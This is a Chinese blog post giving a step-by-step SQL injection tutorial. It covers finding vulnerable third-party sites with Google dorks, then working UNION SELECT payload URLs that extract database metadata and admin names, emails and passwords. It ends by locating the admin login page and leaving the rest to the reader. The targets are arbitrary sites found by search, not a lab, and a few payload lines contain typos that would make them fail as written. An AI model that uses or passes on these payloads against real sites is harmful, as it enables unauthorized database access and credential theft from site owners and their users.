---
layout: post
title: Web攻击-Sql注入
categories:
- Security
tags:
- Hack
- Web Security
- Sql Injection
---
1. 什么是Sql Injection(Sql 注入)

[Sql Injcetion][Sql Injection]是一种非常流行的Web应用程序攻击方法. 通过Sql Injection攻击, 用户可以非法的访问网站的数据库, 甚至导出你的数据(拖库).

通过Sql Injection可以达到什么目的?

- 绕道登陆
- 访问安全数据
- 篡改网站数据
- 拖垮数据库服务器

Ok, Let's go.

Step 1: 寻找容易攻击的网站

在这里我们可以利用Google来寻找目标主机, 利用一些特点的关键词

eg:

	inurl:index.php?id=
	inurl:article.php?id=
	inrul:post.php?id=

我们称这些词为"Google dork".

选择一个适当的关键词进行搜索, 我们会获取到很多结果. 对这些结果一一进行漏洞测试.

注: 如果你要对一个特定的网站进行攻击,你应该这样搜索:

    site:www.example.com dork_list

Step 2: 漏洞测试

在你要测试的目标主机的url后面添加单引号('), 

eg:

	http://www.example.com/index.php?id=2'

如果网页显示正常或者'404 not found', 则这个主机是比较安全的. 对一个初学者, 建议重新选择一个目标.

如果网页显示如下的错误, 那么恭喜你, 可以顺利进入下一步了.
	
	You hava an error in SQL sytax; check the manual that corresponds to your MySQL server version for the right syntax to use near '\" at line 1

Step 3: 获取表的字段数(列数)

上一步中我们已经获取了一个可以来用进行Sql Injection的目标主机. 这一步我们将获取到表的字段数.

替换上一步中我们添加的单引号(')为 "order by n", n从1开始不断的递增. 直到页面显示类似"unknown column"的错误.

eg:
    
	http://www.example.com/index.php?id=2 order by 1
	http://www.example.com/index.php?id=2 order by 2
	http://www.example.com/index.php?id=2 order by 3
	http://www.example.com/index.php?id=2 order by 4

假如在 order by x 的时候出现错误, 则字段数=x-1

如果上面的方法不起作用, 你可以试试下面的方法

eg:

	http://www.example.com/index.php?id=2 order by n --

Step 4: 获取易受攻击的字段

上一步中我们获取到了表的字段数.这一步我们通过连接查询获取容易受攻击的字段. 

首先, 将上一步中id=2修改为一个负数, 然后在后面添加 "union select 1,2,3,...x-1".

eg:

上一步中我们获取字段数位7, 输入格式如下:

	http://www.example.com/index.php?id=-2 union select 1,2,3,4,5,6,7 --

如果上面方法不起作用, 可以试试下面的格式:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,3,4,5,6,7 --

如果你得到类似下面的结果, 那么我们就可以进行下一步了.
	
	3 Query was empty 7

通过上面的结果, 我们获取了'3'和'7'字段是容易受攻击的. 我们就可以选择它们作为攻击的切入点.

Step 5: 获取数据库版本(version), 数据库名称(database), 用户(user)

我们在上一步中获取了'3'和'7'为容易受攻击的字段. 在这一步中,用version()替换其中的一个.

eg:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,version(),4,5,6,7 --

假如我们获取了版本version() 为5.0.1 .

相同的原理用database(), user()替换.

eg:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,database(),4,5,6,7 --
	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,user(),4,5,6,7 --

如果上面的不成功,可以尝试下面的方法:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,unhex(hex(@@version)),4,5,6,7 --

Step 6: 获取表名

用" group_concat(table_name) "替换3, 然后在后面添加 "from information_schema.tables where table_schema=database() --" 

eg:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(table_name),4,5,6,7 from information_schema.tables where table_schema=database() --

注解: 通过Mysql的information_schema.tables 获取 输入数据库的database()的表.group_concat 是将这些表名连接起来. 

如果执行成功,我们将获取如下的格式:
	
	admin,banner,cini_news,cini_news_fr,gallery_categories,gallery_comments,gallery_groupaccess  Query was empty 	7

通过表名,你应该能够获得很多信息吧. 这里我选择"admin" 表

注: 也可以通过bind sql injection (Sql盲注)获表名, 但并不是这篇文章讨论的.

Step 7: 获取表的字段

替换"group_concat(table_name)"为"gourp_concat(column_name)"

替换"from information_schema.tables where talbe_schema=database()--"为"from information_schema.columns where table_name=char(table_name)--"
	
eg:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(column_name),4,5,6,7 from information_schema.columns where table_name=char(97,100,109,105,110)--

注意:char(table_name)是将表名转为 mysql char() string.

在线转换工具: http://wocares.com/noquote.php

如果成功执行, 我们得到类似如下的结果:

	id,admin_name,admin_email,admin_password

Step 8: 获取表内容

替换 "group_concat(column_name)"为"gourp_concat(columnname1,0x3a,anothercolumnname2)"

替换 "from information_schema.columns where table_name=char(column_name)" 为 "from table_name"

eg:

	http://www.example.com/index.php?id=-2 and 1=2 union select 1,2,group_concat(admin_name,0x3a,admin_email,0x3a,admin_password),4,5,6,7 from admin --

现在我们就已经获取到了管理的所有信息.

Step 9: 获取管理员登陆页面

eg:

	http://www.example.com/admin.php
	http://www.example.com/admin/login.php
	http://www.example.com/admin.html

注: 在这里我们也可以借助Google. site:www.example.com inurl:admin 或者 site:www.example.com inurl:login 

Step 10:

下来的, 就交给你了.


[Sql Injection]: http://en.wikipedia.org/wiki/SQL_injection "Sql Injection"
